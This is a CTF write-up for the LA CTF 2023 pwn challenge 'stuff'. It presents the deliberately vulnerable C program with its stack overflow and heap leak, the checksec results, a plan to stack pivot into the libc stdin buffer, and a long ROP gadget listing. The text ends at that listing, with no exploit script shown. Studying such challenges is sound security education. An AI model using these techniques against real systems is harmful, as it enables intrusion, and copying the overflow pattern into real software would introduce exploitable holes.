---
layout: post
title: pwn/stuff | LA CTF 2023
description: Ropping without useful gadgets
author: Alexander Zhang
tags: pwn ROP stack-pivot
---

This write-up is also posted on my website at <https://www.alexyzhang.dev/write-ups/lactf-2023/stuff/>.

## Introduction

stuff is one of the three pwn challenges that I wrote for [LA CTF](https://lactf.uclaacm.com/) this year, and it was the hardest non-blockchain pwn challenge with seven solves.
I wrote the challenge without having a specific solution in mind other than stack pivoting to the libc input buffer.
The challenge turned out to be much harder than I expected, and it took me several days to test solve it.
The source is available at <https://github.com/uclaacm/lactf-archive/tree/main/2023/pwn/stuff>.

## The Challenge

The flavor text reads:

> Jason keeps bullying me for using Fedora so here's a binary compiled on Fedora.

A [binary](https://github.com/uclaacm/lactf-archive/raw/main/2023/pwn/stuff/stuff) is provided which should be pretty easy to reverse-engineer.
Here's the source code:

```c++
#include <stdio.h>
#include <stdlib.h>

int main(void) {
  setbuf(stdout, NULL);
  while (1) {
    puts("menu:");
    puts("1. leak");
    puts("2. do stuff");
    int choice;
    if (scanf("%d", &choice) != 1) {
      puts("oops");
      return 1;
    }
    if (choice == 1) {
      printf("here's your leak: %p\n", malloc(8));
    } else if (choice == 2) {
      char buffer[12];
      fread(buffer, 1, 32, stdin);
      return 0;
    }
  }
}
```

A Dockerfile is also provided which shows that the server is running a container based on a Fedora image.

## Stack Pivoting

The program leaks the address of a chunk allocated in the heap, and it does a 32-byte read into a 12-byte buffer.
If you looked at the stack layout, you would see that the read is just enough to overwrite the return address.
In order to do ROP with more than one gadget, we can use a `leave; ret` gadget to stack pivot to the libc stdin buffer in the heap.
The address of the buffer can be calculated from the leak.

## Leaking libc

`checksec` shows that the binary has no PIE, so we can use any gadgets in it without a leak.

<pre><code>$ checksec stuff
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/ctf/lactf-archive/2023/pwn/stuff/stuff&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#A2734C">Partial RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#C01C28">No PIE (0x400000)</span>
</code></pre>

Let's look at the available gadgets.

<pre><code>$ xgadget stuff
TARGET <span style="color:#C01C28">0</span> - <span style="color:#C061CB">&apos;</span><span style="color:#2AA1B3">stuff</span><span style="color:#C061CB">&apos;:</span> <span style="color:#A2734C">ELF</span><span style="color:#C061CB">-</span><span style="color:#A2734C">X64</span><span style="color:#C061CB">,</span> <span style="color:#26A269">0x00000000401090</span> entry<span style="color:#C061CB">,</span> <span style="color:#2A7BDE">581</span><span style="color:#C061CB">/</span><span style="color:#2A7BDE">1</span> executable bytes<span style="color:#C061CB">/</span>segments 

<span style="color:#26A269">0x0000000040111e</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">adc</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401130</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b0</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">adc</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x2f3b</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">hlt</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010dc</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">adc</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x00000000004010f0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040100e</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">-0x7b</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">cl</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">shl</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">byte</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">ptr</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rdx</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">-0x1</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> 0xd0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010bb</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">bl</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dh</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edx</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010bc</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401230</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040115a</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rbp</span><span style="color:#D0CFCC">-0x3d</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ebx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010bd</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">bl</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dh</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edx</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401231</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">cl</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">cl</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010be</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401236</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b3</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">hlt</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401232</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040100d</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e0</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x00000000004010f0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401122</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401130</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040115c</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rbp</span><span style="color:#D0CFCC">-0x3d</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ebx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040115b</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rcx</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">al</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">pop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rbp</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b4</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ah</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dh</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010eb</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">bh</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">bh</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">loopne</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401155</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010bf</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">bl</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dh</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edx</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401237</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">bl</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dh</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edx</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401233</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">cl</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">cl</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e9</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dil</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">dil</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">loopne</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401155</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401157</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x2f0b</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rbp</span><span style="color:#D0CFCC">-0x3d</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ebx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040100a</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x2fe9</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">test</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401017</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">esp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401016</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401014</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010c3</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">cli</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x0000000040123b</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">cli</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010c0</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401238</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">sub</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C01C28">rsp</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x8</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010b5</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">hlt</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rax</span><span style="color:#D0CFCC">+</span><span style="color:#A2734C">rax</span><span style="color:#C061CB">]; </span><span style="color:#2AA1B3">endbr64</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401155</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">inc</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">esi</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">eax</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x2f0b</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">add</span><span style="color:#D0CFCC"> </span><span style="color:#C061CB">[</span><span style="color:#A2734C">rbp</span><span style="color:#D0CFCC">-0x3d</span><span style="color:#C061CB">],</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">ebx</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401012</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401016</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">call</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010e5</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x00000000004010f0</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401127</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">je</span><span style="color:#D0CFCC"> </span><span style="color:#005DD0">short</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401130</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">mov</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">edi</span><span style="color:#C061CB">,</span><span style="color:#D0CFCC"> 0x404050</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010ec</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">jmp</span><span style="color:#D0CFCC"> </span><span style="color:#A2734C">rax</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x00000000401234</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">leave</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
<span style="color:#26A269">0x000000004010ed</span><span style="color:#C061CB">:</span> <span style="color:#2AA1B3">loopne</span><span style="color:#D0CFCC"> </span><span style="color:#26A269">0x0000000000401155</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">nop</span><span style="color:#C061CB">; </span><span style="color:#2AA1B3">ret</span><span style="color:#C061CB">; </span>
